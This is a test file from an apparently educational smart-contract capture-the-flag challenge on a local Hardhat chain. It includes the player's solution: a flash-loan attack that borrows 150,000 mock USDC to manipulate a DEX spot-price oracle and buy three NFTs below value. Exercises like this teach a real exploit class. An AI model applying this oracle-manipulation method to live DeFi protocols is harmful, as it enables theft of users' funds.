const { expect } = require("chai");
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');

/**
 * Test Suite for Fool the Oracle Challenge 02
 */
describe("Fool the Oracle Challenge 02", function () {
    // Contract instances
    let usdcToken;
    let studentNFT;
    let simpleDEX;
    let nftMarketplace;
    let flashLoanProvider;

    // Actors
    let deployer, player;

    // Constants
    const INITIAL_LIQUIDITY_ETH = ethers.parseEther("100"); // Inital ETH liquidity in the DEX
    const INITIAL_LIQUIDITY_USDC = ethers.parseEther("200000"); // Inital USDC liquidity in the DEX 
    const FLASH_LOAN_POOL_USDC = ethers.parseEther("200000"); // 200k USDC in flash loan pool
    const PLAYER_INITIAL_ETH = ethers.parseEther("3"); // Inital ETH balance for player
    const PLAYER_INITIAL_USDC = ethers.parseEther("0"); // Inital USDC balance for player
    const NFT_PRICE_IN_USD = ethers.parseEther("5000"); // Default NFT price (will be overridden)
    const NFT_COUNT = 3; // Number of NFTs to steal

    before("Set up the challenge", async function () {
        /** DO NOT CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        console.log("Deploying contracts...");

        // Deploy USDC Token
        const USDCToken = await ethers.getContractFactory("USDCToken", deployer);
        usdcToken = await USDCToken.deploy(ethers.parseEther("1000000")); // 1M USDC initial supply

        // Deploy SimpleDEX (our price oracle)
        const SimpleDEX = await ethers.getContractFactory("SimpleDEX", deployer);
        simpleDEX = await SimpleDEX.deploy(usdcToken.target);

        // Add initial liquidity to DEX
        await usdcToken.approve(simpleDEX.target, INITIAL_LIQUIDITY_USDC);
        await simpleDEX.addLiquidity(INITIAL_LIQUIDITY_USDC, { value: INITIAL_LIQUIDITY_ETH });

        // Log initial price and liquidity
        console.log("Initial price and liquidity on the DEX:");
        console.log(`ETH liquidity: ${ethers.formatEther(INITIAL_LIQUIDITY_ETH)} ETH`);
        console.log(`USDC liquidity: ${ethers.formatEther(INITIAL_LIQUIDITY_USDC)} USDC`);
        const initialPrice = await simpleDEX.getCurrentUsdcToEthPrice();
        console.log(`Initial exchange rate: 1 ETH = ${ethers.formatEther(initialPrice)} USDC`);

        // Deploy FEL Student NFT
        const FELStudentNFT = await ethers.getContractFactory("FELStudentNFT", deployer);
        studentNFT = await FELStudentNFT.deploy();

        // Deploy Flash Loan Provider with USDC
        const FlashLoanProvider = await ethers.getContractFactory("FlashLoanProvider", deployer);
        flashLoanProvider = await FlashLoanProvider.deploy(usdcToken.target);

        // Fund flash loan provider with USDC
        await usdcToken.transfer(flashLoanProvider.target, FLASH_LOAN_POOL_USDC);

        // Deploy NFT Marketplace
        const NFTMarketplace = await ethers.getContractFactory("FELStudentNFTMarketplace", deployer);
        nftMarketplace = await NFTMarketplace.deploy(
            simpleDEX.target,
            studentNFT.target,
            usdcToken.target
        );

        // Create custom trait combinations for variety
        const nftTraits = [
            { program: 0, sleep: 3, tool: 8 },  // EEM, Pulling All-Nighter for Zkouska, Stackoverflow
            { program: 6, sleep: 7, tool: 3 },  // SIT, Dreaming of Statnice, Headphones
            { program: 8, sleep: 4, tool: 5 }   // UEK, Power Napper, Tahak
        ];

        // Mint NFTs with specific traits
        for (let i = 0; i < NFT_COUNT; i++) {
            await studentNFT.mint(
                deployer.address,
                nftTraits[i].program,
                nftTraits[i].sleep,
                nftTraits[i].tool
            );
        }

        // Set default NFT price in USD
        await nftMarketplace.setDefaultPrice(NFT_PRICE_IN_USD);

        // List NFTs in the marketplace with different prices - total value ~8 ETH
        const nftPrices = [
            ethers.parseEther("3500"),  // NFT #1: 3,500 USDC (~1.75 ETH)
            ethers.parseEther("7500"),  // NFT #2: 7,500 USDC (~3.75 ETH)
            ethers.parseEther("5000")   // NFT #3: 5,000 USDC (~2.5 ETH)
        ];

        console.log("\n=== FEL STUDENT NFT MARKETPLACE LISTINGS ===");

        for (let i = 1; i <= NFT_COUNT; i++) {
            // Give the NFTs to market place and set individual price for each NFT
            await studentNFT.approve(nftMarketplace.target, i);
            await nftMarketplace.receiveNFT(i);
            await nftMarketplace.setNFTPrice(i, nftPrices[i - 1]);

            // Get traits and current ETH price
            const traits = await nftMarketplace.getNFTTraits(i);
            const ethPrice = await nftMarketplace.getCurrentPriceForNFT(i);

            // Extract trait values for display
            const traitParts = traits.split(", ");
            const program = traitParts[0].split(": ")[1];
            const sleep = traitParts[1].split(": ")[1];
            const tool = traitParts[2].split(": ")[1];

            // Output in descriptive format
            console.log(`\nNFT #${i}`);
            console.log(`  ID: ${i}`);
            console.log(`  Program: ${program}`);
            console.log(`  Sleep Status: ${sleep}`);
            console.log(`  Study Tool: ${tool}`);
            console.log(`  Price (USD): ${ethers.formatEther(nftPrices[i - 1])}`);
            console.log(`  Price (ETH): ${ethers.formatEther(ethPrice)}`);
        }

        console.log("\nTotal ETH value of all NFTs:", ethers.formatEther(
            await nftMarketplace.getCurrentPriceForNFT(1) +
            await nftMarketplace.getCurrentPriceForNFT(2) +
            await nftMarketplace.getCurrentPriceForNFT(3)
        ), "ETH");

        // Verify NFTs are listed
        const listedCount = await nftMarketplace.getListedNFTCount();
        expect(listedCount).to.equal(NFT_COUNT);
        console.log(`All ${listedCount} FEL Student NFTs are available for purchase in the marketplace.`);

        // Show flash loan information
        console.log("\nFlash loan available:", ethers.formatEther(await flashLoanProvider.maxFlashLoan(usdcToken.target)), "USDC");
        console.log("Flash loan fee: 0.01% (1 basis point)");

        // Set up player's initial balance 
        await setBalance(player.address, PLAYER_INITIAL_ETH);
        await usdcToken.transfer(player.address, PLAYER_INITIAL_USDC);

        // Verify player's balance
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH);
        expect(await usdcToken.balanceOf(player.address)).to.equal(PLAYER_INITIAL_USDC);
        console.log(`Player's initial balance: ${ethers.formatEther(PLAYER_INITIAL_ETH)} ETH and ` +
            `${ethers.formatEther(PLAYER_INITIAL_USDC)} USDC`);
    });

    it("Execution of player's exploit", async function () {
        /** CODE YOUR SOLUTION HERE */

        // Deploy the attacker contract
        console.log("\n=== DEPLOYING FLASH LOAN ATTACK CONTRACT ===");
        const FlashLoanNFTAttacker = await ethers.getContractFactory("FlashLoanNFTAttacker", player);
        const attacker = await FlashLoanNFTAttacker.deploy(
            flashLoanProvider.target,
            usdcToken.target,
            simpleDEX.target,
            nftMarketplace.target,
            studentNFT.target
        );
        console.log(`Attacker contract deployed at: ${attacker.target}`);

        // Create array of NFT IDs to target
        const nftIds = [1, 2, 3]; // IDs of the NFTs we want to acquire
        await attacker.setTargets(nftIds);
        console.log(`Target NFTs set: ${nftIds.join(", ")}`);

        // Calculate how much USDC we need to borrow
        // We'll borrow a large amount to significantly impact the price
        const borrowAmount = ethers.parseEther("150000"); // 150,000 USDC

        // Calculate the flash loan fee (0.01%)
        const flashLoanFee = await flashLoanProvider.flashFee(usdcToken.target, borrowAmount);
        console.log(`\n=== EXECUTING FLASH LOAN ATTACK ===`);
        console.log(`Flash loan amount: ${ethers.formatEther(borrowAmount)} USDC`);
        console.log(`Flash loan fee: ${ethers.formatEther(flashLoanFee)} USDC`);

        // Calculate approximately how much ETH we'll need
        // We need some extra ETH to buy the NFTs at the manipulated price
        // and to cover the flash loan fee when converted to ETH
        const estimatedEthNeeded = ethers.parseEther("1.5"); // Estimate based on expected price manipulation
        console.log(`Estimated ETH needed: ${ethers.formatEther(estimatedEthNeeded)} ETH`);
        
        // Send most of our ETH to the attacker contract, keeping some for transaction fees
        const ethToKeep = ethers.parseEther("1.6"); // Keep some ETH for gas
        const ethToSend = PLAYER_INITIAL_ETH - ethToKeep;
        await player.sendTransaction({
            to: attacker.target,
            value: ethToSend
        });
        console.log(`Sent ${ethers.formatEther(ethToSend)} ETH to attacker contract`);

        // Execute the attack
        await attacker.executeAttack(borrowAmount, { value: estimatedEthNeeded });
    });

    after("Success conditions", async function () {
        /** DO NOT CHANGE ANYTHING HERE */

        // The player should own all NFTs
        for (let i = 1; i <= NFT_COUNT; i++) {
            expect(await studentNFT.ownerOf(i)).to.equal(
                player.address,
                `Player doesn't own NFT #${i}`
            );
        }

        // Get the final balances for logging
        const playerFinalBalance = await ethers.provider.getBalance(player.address);
        const finalUsdcBalance = await usdcToken.balanceOf(player.address);

        console.log(`\n=== ATTACK RESULTS ===`);
        console.log(`Player's final ETH balance: ${ethers.formatEther(playerFinalBalance)} ETH`);
        console.log(`Player's final USDC balance: ${ethers.formatEther(finalUsdcBalance)} USDC`);

        // The final price in the DEX after the attack
        const finalPrice = await simpleDEX.getCurrentUsdcToEthPrice();
        console.log(`Final price: 1 ETH = ${ethers.formatEther(finalPrice)} USDC`);
    });
});